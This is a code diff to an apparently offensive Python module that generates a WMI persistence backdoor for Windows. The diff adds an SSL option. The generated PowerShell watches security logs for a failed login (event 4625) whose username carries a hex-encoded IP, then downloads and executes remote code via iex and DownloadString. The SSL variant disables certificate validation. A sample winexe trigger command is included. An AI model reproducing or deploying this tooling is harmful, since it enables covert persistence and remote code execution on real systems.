@@ -22,7 +22,7 @@ winexe -U FailName@7F000001%password //192.168.0.100
 
 ''' 
     #create a list of possible options
-    option_list=["FailName","callback_port","callback_file","filter","consumer","reset_auditpol","output_file"]
+    option_list=["FailName","callback_port","callback_file","filter","consumer","reset_auditpol","use_ssl","output_file"]
    
 
     #initialize variables
@@ -33,7 +33,7 @@ winexe -U FailName@7F000001%password //192.168.0.100
     callback_port=setting("callback_port","4444",True,"Callback Port")
     callback_file=setting("callback_file","",True,"Powershell file to get after failed login")
     reset_auditpol=setting("reset_auditpol","yes",True,"Upon uninstall, reset auditpolicy to NOT log failures?")
-
+    use_ssl=setting("use_ssl","no",True,"Set to 'yes' if you want to use SSL")
     output_file=setting("output_file","",False,"local output filename")
     
     #initialize power_beacon class
@@ -48,9 +48,16 @@ winexe -U FailName@7F000001%password //192.168.0.100
         callback_port=self.callback_port.value
         callback_file=self.callback_file.value
         reset_auditpol=self.reset_auditpol.value
+        use_ssl=self.use_ssl.value
         
         
-        messageblock = '''if(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s){$x=(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s).split('@');iex(New-Object Net.WebClient).DownloadString('http://0x'+$x[1]+':%s/%s')}''' % (FailName,FailName,callback_port,callback_file)
+
+        if use_ssl == "no":
+            messageblock = '''if(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s){$x=(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s).split('@');iex(New-Object Net.WebClient).DownloadString('http://0x'+$x[1]+':%s/%s')}''' % (FailName,FailName,callback_port,callback_file)
+
+        else:
+            messageblock = '''if(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s){$x=(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s).split('@');[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.WebClient).DownloadString('https://0x'+$x[1]+':%s/%s')}''' % (FailName,FailName,callback_port,callback_file)
+
 
         encodedmessage = b64encode(messageblock.encode('UTF-16LE'))
 
@@ -92,6 +99,9 @@ $x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\roo
         if (reset_auditpol != "yes") and (reset_auditpol != "no"):         
             print "reset_auditpol must be 'yes' or 'no'"
             return 
+        if (use_ssl != "yes") and (use_ssl != "no"):
+            print "use_ssl must be either yes or no"
+            return
         if output=='':
             print data
             print "\n"
